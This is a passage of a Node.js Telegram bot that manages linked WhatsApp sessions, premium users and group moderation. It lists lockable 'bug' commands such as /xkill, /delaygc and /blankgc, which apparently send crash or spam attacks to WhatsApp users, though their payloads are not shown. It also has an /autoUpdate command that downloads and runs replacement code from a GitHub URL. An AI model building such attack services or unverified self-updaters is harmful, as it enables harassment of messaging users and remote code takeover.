    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`js
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`js
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

// ======================== kunci/buka COMMAND BUG ========================
const bugCommands = [
  "/xbugs", "/xkill", "/xynerx", "/xivorx",
  "/zypherx", "/forexit", "/noctex", "/foreclx",
  "/qexon", "/forcloz", "/fconemsg", "/delaygc", "/hecte", "/blankgc", "/forceclick", "/Blank", "/buldozer", "/makloe", "/neyrx", "/xspam", "/xoya", "/xfc", "BlankV2"
];
let commandLocks = {};
for (const cmd of bugCommands) commandLocks[cmd] = false;
function getStatus(cmd) { return commandLocks[cmd] ? "OFF" : "ONN"; }

bot.onText(/\/kunci (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const cmd = match[1].trim();
  if (!bugCommands.includes(cmd)) return bot.sendMessage(chatId, `❌ Command ${cmd} tidak dikenal.`);
  if (commandLocks[cmd]) return bot.sendMessage(chatId, `⚠️ ${cmd} sudah OFF.`);
  commandLocks[cmd] = true;
  bot.sendMessage(chatId, `🔒 ${cmd} sekarang OFF (terkunci).`);
});

bot.onText(/\/buka (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const cmd = match[1].trim();
  if (!bugCommands.includes(cmd)) return bot.sendMessage(chatId, `❌ Command ${cmd} tidak dikenal.`);
  if (!commandLocks[cmd]) return bot.sendMessage(chatId, `⚠️ ${cmd} sudah ONN.`);
  commandLocks[cmd] = false;
  bot.sendMessage(chatId, `🔓 ${cmd} sekarang ONN (terbuka).`);
});

bot.onText(/\/listlock/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const locked = bugCommands.filter(cmd => commandLocks[cmd]);
  if (locked.length === 0) return bot.sendMessage(chatId, "✅ Semua command dalam keadaan ONN (terbuka).");
  bot.sendMessage(chatId, `🔒 Command terkunci (OFF):\n${locked.map(c => `• ${c}`).join('\n')}`);
});

bot.onText(/\/connect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

// Auto Update
// ============= KONSTANTA REPO =============
const Owner = "Darlin77";              // username GitHub
const Repo = "Base-";                  // nama repository
const BranchPath = "main/index.js";    // branch + path file

// Membangun raw URL dari konstanta
const DEFAULT_RAW_URL = `https://raw.githubusercontent.com/${Owner}/${Repo}/refs/heads/${BranchPath}`;

// ============= KONFIGURASI =============
const BOT_FILE = path.join(__dirname, 'index.js');
const BACKUP_FILE = path.join(__dirname, 'index.js.bak');

// Fungsi download file
async function downloadFile(url, outputPath) {
  const writer = fs.createWriteStream(outputPath);
  const response = await axios({
    method: 'get',
    url: url,
    responseType: 'stream',
  });
  response.data.pipe(writer);
  return new Promise((resolve, reject) => {
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
}

// Perintah /autoUpdate (tanpa parameter, langsung pakai repo dari konstanta)
bot.onText(/\/autoUpdate/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya untuk owner bot.', { parse_mode: 'Markdown' });
  }

  await bot.sendMessage(chatId, '🔄 *Memulai update dari repo...*', { parse_mode: 'Markdown' });
  await bot.sendMessage(chatId, `📦 Repo: \`${Owner}/${Repo}\`\n📁 File: \`${BranchPath}\``, { parse_mode: 'Markdown' });

  try {
    // Backup file lama
    if (fs.existsSync(BOT_FILE)) {
      fs.copyFileSync(BOT_FILE, BACKUP_FILE);
      await bot.sendMessage(chatId, '✅ Backup file lama berhasil (index.js.bak)');
    }

    // Download file baru
    await bot.sendMessage(chatId, '📥 Mengunduh file baru dari GitHub...');
    await downloadFile(DEFAULT_RAW_URL, BOT_FILE);
    await bot.sendMessage(chatId, '✅ File baru berhasil diunduh.');

    // Restart bot
    await bot.sendMessage(chatId, '♻️ Bot akan *restart* dalam 3 detik...', { parse_mode: 'Markdown' });
    setTimeout(() => {
      process.exit(0);
    }, 3000);

  } catch (error) {
    console.error('Update error:', error);
    await bot.sendMessage(chatId, `❌ Gagal update: ${error.message}\n\nMengembalikan ke versi sebelumnya...`);

    if (fs.existsSync(BACKUP_FILE)) {
      fs.copyFileSync(BACKUP_FILE, BOT_FILE);
      await bot.sendMessage(chatId, '✅ Versi sebelumnya dipulihkan.');
    }
  }
});

// (Opsional) Perintah untuk melihat URL default    
bot.onText(/\/cekrepo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.');
  bot.sendMessage(chatId, `🔗 Raw URL:\n\`${DEFAULT_RAW_URL}\``, { parse_mode: 'Markdown' });
});

console.log(`✅ Auto update siap. Repo: ${Owner}/${Repo} -> ${BranchPath}`);

// ~ Group Menu
const data = {}

function ensure(chatId) {
  if (!data[chatId]) {
    data[chatId] = {
      welcome: { enabled: true, text: "Selamat datang {name}!", photo: null },
      rules: "Belum ada rules.",
      warns: {},
      blocklist: []
    }
  }
}

function parseDurationToSeconds(s) {
  if (!s) return null
  const m = s.match(/^(\d+)(s|m|h|d)$/i)
  if (!m) return null
  const n = parseInt(m[1], 10)
  const u = m[2].toLowerCase()
  if (u === "s") return n
  if (u === "m") return n * 60
  if (u === "h") return n * 3600
  if (u === "d") return n * 86400
  return null
}

async function isAdmin(bot, chatId, userId) {
  const admins = await bot.getChatAdministrators(chatId)
  return admins.some(a => a.user.id === userId)
}

bot.on("message", async (msg) => {
  const chatId = msg.chat.id
  ensure(chatId)
  const txt = msg.text || ""
  if (msg.new_chat_members && data[chatId].welcome && data[chatId].welcome.enabled) {
    for (const u of msg.new_chat_members) {
      const name = u.username ? "@" + u.username : u.first_name
      const caption = (data[chatId].welcome.text || "Welcome").replace(/\{name\}/g, name)
      const buttons = {
        reply_markup: {
          inline_keyboard: [
            [{ text: "👥 Rules", callback_data: "show_rules" }],
            [{ text: "📢 Info Grup", callback_data: "show_info" }]
          ]
        }
      }
      try {
        if (data[chatId].welcome.photo) {
          await bot.sendPhoto(chatId, data[chatId].welcome.photo, { caption, ...buttons })
        } else {
          await bot.sendMessage(chatId, caption, buttons)
        }
      } catch {}
    }
  }
  if (msg.left_chat_member) {
    const name = msg.left_chat_member.username ? "@" + msg.left_chat_member.username : msg.left_chat_member.first_name
    try { await bot.sendMessage(chatId, `${name} keluar dari grup`) } catch {}
  }
  if (txt && /@admin/i.test(txt)) {
    try {
      const admins = await bot.getChatAdministrators(chatId)
      const mentions = admins.filter(a => !a.user.is_bot).map(a => a.user.username ? "@" + a.user.username : a.user.first_name).join(" ")
      await bot.sendMessage(chatId, "Memanggil admin:\n" + (mentions || "Tidak ada admin"))
    } catch {}
  }
  if (txt && data[chatId].blocklist && data[chatId].blocklist.length) {
    for (const bad of data[chatId].blocklist) {
      if (!bad) continue
      try {
        if (txt.toLowerCase().includes(bad.toLowerCase())) {
          await bot.deleteMessage(chatId, msg.message_id)
          return
        }
      } catch {}
    }
  }
})

bot.on("callback_query", async (q) => {
  const chatId = q.message.chat.id
  ensure(chatId)
  const d = q.data
  if (d === "show_rules") {
    await bot.answerCallbackQuery(q.id)
    await bot.sendMessage(chatId, `👥 Rules Grup:\n\n${data[chatId].rules}`)
    return
  }
  if (d === "show_info") {
    await bot.answerCallbackQuery(q.id)
    try {
      const chat = await bot.getChat(chatId)
      const desc = chat.description || "Tidak ada deskripsi grup."
      await bot.sendMessage(chatId, `📢 Info Grup:\n\n${desc}`)
    } catch { await bot.sendMessage(chatId, "Gagal mengambil deskripsi grup") }
    return
  }
  if (d === "welcome_on") {
    data[chatId].welcome.enabled = true
    await bot.answerCallbackQuery(q.id, { text: "Welcome Active" })
    await bot.sendMessage(chatId, "Welcome Active")
    return
  }
  if (d === "welcome_off") {
    data[chatId].welcome.enabled = false
    await bot.answerCallbackQuery(q.id, { text: "Welcome Non Active" })
    await bot.sendMessage(chatId, "Welcome Non Active")
    return
  }
  if (d.startsWith("clear_warn_")) {
    const parts = d.split("_")
    const uid = parseInt(parts[2], 10)
    data[chatId].warns[uid] = 0
    await bot.answerCallbackQuery(q.id, { text: "Warn direset" })
    await bot.sendMessage(chatId, "Warn user telah direset")
    return
  }
  if (d.startsWith("unwarn_")) {
    const uid = parseInt(d.split("_")[1], 10)
    const cur = data[chatId].warns[uid] || 0
    if (cur <= 0) {
      await bot.answerCallbackQuery(q.id, { text: "User tidak punya warn" })
      return
    }
    data[chatId].warns[uid] = cur - 1
    await bot.answerCallbackQuery(q.id, { text: "Warn dikurangi" })
    await bot.sendMessage(chatId, `Warn user berkurang (${data[chatId].warns[uid]}/3)`)
    return
  }
  if (d.startsWith("delblock_")) {
    const raw = d.replace("delblock_", "")
    const word = decodeURIComponent(raw)
    data[chatId].blocklist = (data[chatId].blocklist || []).filter(w => w !== word)
    await bot.answerCallbackQuery(q.id, { text: "Kata dihapus" })
    await bot.sendMessage(chatId, `${word} dihapus dari blocklist`)
    return
  }
  if (d === "unpin") {
    try { await bot.unpinChatMessage(chatId); await bot.answerCallbackQuery(q.id, { text: "Pesan di-unpin" }); await bot.sendMessage(chatId, "Pesan di-unpin") } catch { await bot.answerCallbackQuery(q.id, { text: "Gagal unpin" }) }
    return
  }
})

bot.onText(/^\/setrules(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const t = match && match[1] ? match[1].trim() : ""
  if (!t) return bot.sendMessage(chatId, "Gunakan: /setrules <rules>")
  data[chatId].rules = t
  bot.sendMessage(chatId, "Rules Updated !")
})

bot.onText(/^\/setwelcome(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const textArg = match && match[1] ? match[1].trim() : null
  if (textArg) data[chatId].welcome.text = textArg
  if (msg.reply_to_message && msg.reply_to_message.photo) {
    const ph = msg.reply_to_message.photo
    data[chatId].welcome.photo = ph[ph.length - 1].file_id
  }
  data[chatId].welcome.enabled = true
  await bot.sendMessage(chatId, "Welcome Updated !", {
  })
})

bot.onText(/^\/welcome\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id
  ensure(chatId)
  data[chatId].welcome.enabled = match[1].toLowerCase() === "on"
  bot.sendMessage(chatId, `Welcome ${data[chatId].welcome.enabled ? "Active !" : "Non Active !"}`)
})

bot.onText(/^\/addblocklist\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  ensure(chatId)
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  const word = match[1].trim()
  if (!word) return bot.sendMessage(chatId, "Gunakan: /addblocklist <pesan>")
  if (!data[chatId].blocklist.includes(word)) data[chatId].blocklist.push(word)
  bot.sendMessage(chatId, `${word} ditambahkan ke blocklist`, {
    reply_markup: { inline_keyboard: [[{ text: "Hapus kata", callback_data: "delblock_" + encodeURIComponent(word) }]] }
  })
})

bot.onText(/^\/delblocklist\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const word = match[1].trim()
  data[chatId].blocklist = (data[chatId].blocklist || []).filter(w => w !== word)
  bot.sendMessage(chatId, `${word} dihapus dari blocklist`)
})

bot.onText(/^\/blocklist$/i, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const list = (data[chatId].blocklist || []).join("\n") || "Blocklist kosong"
  bot.sendMessage(chatId, `📌 Blocklist:\n${list}`)
})

function getTarget(msg) {
  if (msg.reply_to_message && msg.reply_to_message.from) return msg.reply_to_message.from.id;

  const check = (entities, text) => {
    if (!entities || !text) return null;
    for (const e of entities) {
      if (e.type === 'text_mention' && e.user) return e.user.id;
      if (e.type === 'mention') return text.substring(e.offset + 1, e.offset + e.length);
    }
    return null;
  };

  const fromText = check(msg.entities, msg.text);
  if (fromText) return fromText;

  const fromCaption = check(msg.caption_entities, msg.caption);
  if (fromCaption) return fromCaption;

  return null;
}

async function resolveUsername(bot, chatId, username) {
  try {
    const members = await bot.getChatAdministrators(chatId)
    const found = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())
    return found ? found.user.id : null
  } catch {
    return null
  }
}

bot.onText(/^\/promote/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.promoteChatMember(chatId, target, {
      can_manage_chat: true,
      can_delete_messages: true,
      can_invite_users: true,
      can_restrict_members: true
    })
    bot.sendMessage(chatId, "Promoted !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal promote" + e)
  }
})

bot.onText(/^\/demote/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.promoteChatMember(chatId, target, {
      can_manage_chat: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false
    })
    bot.sendMessage(chatId, "Demoted !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal demote" + e)
  }
})

bot.onText(/^\/mute/, async (msg) => {
  if (!msg.chat.type.includes("group")) return;
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  try {
    await bot.restrictChatMember(chatId, target, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_polls: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false,
      },
    });
    await bot.sendMessage(chatId, `User ${reply.from.first_name} Telah Di Mute !.`);
  } catch (e) {
    await bot.sendMessage(chatId, `❌ ⵢ Gagal mute user: ${e.message}`);
  }
});

bot.onText(/^\/unmute/, async (msg) => {
  if (!msg.chat.type.includes("group")) return;
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  try {
    await bot.restrictChatMember(chatId, target, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false,
      },
    });
    await bot.sendMessage(chatId, `User ${reply.from.first_name} Telah Di Unmute !.`);
  } catch (e) {
    await bot.sendMessage(chatId, `❌ ⵢ Gagal unmute user: ${e.message}`);
  }
});

bot.onText(/^\/kick/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.banChatMember(chatId, target)
    await bot.unbanChatMember(chatId, target)
    bot.sendMessage(chatId, "User Kick !")
  } catch {
    bot.sendMessage(chatId, "Gagal kick")
  }
})

bot.onText(/^\/band/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.banChatMember(chatId, target)
    bot.sendMessage(chatId, "User Banned !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal ban" + e)
  }
})

bot.onText(/^\/unban/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.unbanChatMember(chatId, target)
    bot.sendMessage(chatId, "User Unbanned !")
  } catch {
    bot.sendMessage(chatId, "Gagal unban")
  }
})

bot.onText(/^\/warn$/i, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const reply = msg.reply_to_message
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
